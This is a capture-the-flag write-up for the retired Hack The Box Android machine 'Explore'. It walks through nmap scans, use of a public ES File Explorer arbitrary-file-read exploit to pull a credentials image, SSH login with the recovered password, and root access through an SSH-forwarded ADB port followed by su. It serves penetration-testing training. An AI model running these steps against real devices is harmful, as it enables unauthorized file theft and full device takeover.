# Explore

This is the write-up for the box Explore that got retired at the 30th October 2021.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.247    explore.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/explore.nmap 10.10.10.247
```

```
PORT     STATE    SERVICE VERSION
2222/tcp open     ssh     (protocol 2.0)
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
5555/tcp filtered freeciv
```

The SSH service is run with **Banana Studio**, which is an Android application and port 5555 is filtered.

Full TCP port scan:
```
nmap -p- 10.10.10.247
```
```
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
42135/tcp open     unknown
42753/tcp open     unknown
59777/tcp open     unknown
```

Service scan on found ports:
```
nmap -p 42135,42753,59777 -sC -sV 10.10.10.247
```
```
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
42753/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
(...)
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
```

When researching the ports, the port 59777 is used by the Android app **ES File Explorer** and it has an [Arbitrary File Read vulnerability](https://www.exploit-db.com/exploits/50070).

## Exploiting ES File Explorer (Port 59777)

The web service on port 59777 responds with a HTTP status code _500 Internal Server Error_ and the following message:
```
SERVER INTERNAL ERROR: Serve() returned a null response.
```

Downloading the exploit script with **Searchsploit**:
```
searchsploit -m android/remote/50070.py
```

Using the _getDeviceInfo_ parameter of the script:
```
python3 50070.py getDeviceInfo 10.10.10.247
```
```
ftpRoot : /sdcard
ftpPort : 3721
```

Listing all files with the _listFiles_ and _listPics_ parameter:
```
python3 50070.py listFiles 10.10.10.247

python3 50070.py listPics 10.10.10.247
```

The picture _creds.jpg_ sounds interesting, so it can be downloaded:
```
python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
```

It is a handwritten note with potential credentials:
```
Kristi:Kr1sT!5h@Rp3xPl0r3!
```

The credentials are working on the SSH service on port 2222:
```
ssh -p 2222 kristi@10.10.10.247
```

> NOTE: The flag can be found in _/storage/emulated/0/user.txt_.

## Privilege Escalation

When checking the open ports, the command `ss -lnpt` shows that port 5555 is listening on localhost.
On an Android system this port is used by the **Android Debug Bridge (adb)**.

Forwarding the port to our local client with the **SSH command line**:
```
ssh> -L 5555:localhost:5555
Forwarding port.
```

Connecting to the Android debug bridge:
```
adb connect localhost:5555
```

Listing all devices
```
adb devices -l
```
```
List of devices attached
emulator-5554          device product:android_x86_64 model:VMware_Virtual_Platform device:x86_64 transport_id:1
localhost:5555         device product:android_x86_64 model:VMware_Virtual_Platform device:x86_64 transport_id:2
```

Starting a shell on the device:
```
adb -s localhost:5555 shell
```

This starts a shell as the user _shell_ which can escalate privileges to root!
```
x86_64:/ $ su -
```

> NOTE: The flag can be found in _/data/root.txt_.
